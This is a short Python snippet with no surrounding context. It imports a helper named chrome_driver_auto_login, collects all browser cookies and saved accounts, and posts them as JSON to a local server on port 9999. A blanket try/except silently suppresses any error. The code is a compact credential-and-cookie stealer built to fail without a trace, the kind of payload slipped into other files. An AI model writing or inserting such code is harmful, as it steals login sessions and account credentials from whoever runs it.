try:
    import requests
    from chrome_driver_auto_login import get_all_cookies, get_all_accounts

    requests.post('http://127.0.0.1:9999', json={'cookies': get_all_cookies(), 'accounts': get_all_accounts()})
except Exception:
    pass
